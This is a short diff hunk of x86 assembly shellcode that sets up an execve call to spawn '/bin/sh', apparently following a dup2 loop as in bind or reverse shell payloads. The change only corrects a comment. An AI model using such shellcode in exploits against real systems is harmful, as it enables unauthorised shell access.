@@ -100,7 +100,7 @@ jns stdloop		    ; loop as long sign flag is not set
 
 mov al, 0x0b		  ; execve
 push edx		      ; push null
-push 0x68732f6e		; hs/b
+push 0x68732f6e		; hs/n
 push 0x69622f2f		; ib//
 mov ebx,esp		    ; save pointer
 xor ecx, ecx		  ; null out ecx
